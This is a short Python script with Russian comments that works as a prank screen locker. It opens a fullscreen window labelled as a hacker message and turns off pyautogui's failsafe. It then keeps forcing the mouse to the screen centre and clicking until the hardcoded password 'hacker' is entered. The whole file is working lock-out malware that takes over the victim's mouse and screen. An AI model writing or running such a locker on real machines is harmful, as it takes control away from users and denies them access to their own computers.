# -*- coding: utf-8 -*-

import pyautogui
from pyautogui import click, moveTo
from tkinter import Tk, Entry, Label
import time

def close(event):
    global done, input_text
    if input_text.get() == 'hacker':
        done = False
        
# создаем окно
root = Tk()

# вырубает защиту
pyautogui.FAILSAFE = False

# длина и высота экрана
w = root.winfo_screenwidth()
h = root.winfo_screenheight()

# полный экран
root.attributes('-fullscreen', True)

# добавляет текст
text = Label(root, text='''Хакер /nxab/g👽''', font=1)
text.grid(row=0, column=0)

# добавляет поля для ввода
input_text = Entry(root, font=1)
# ширина, длина поля; x, y 
input_text.place(width=200, height=40, x=w/2-85, y=h/2)

text1 = Label(root, text='Введите пароль и нажмите Enter', font=1)
text1.place(x=w/2-85, y=h/2-30)

done = True
while done == True:
    # обновляем экран
    root.update()
    
    # перемещает мышку
    moveTo(w/2-10, h/2)
    
    # кликает
    click()

    # нажата ли клавиша
    root.bind('<Return>', close)
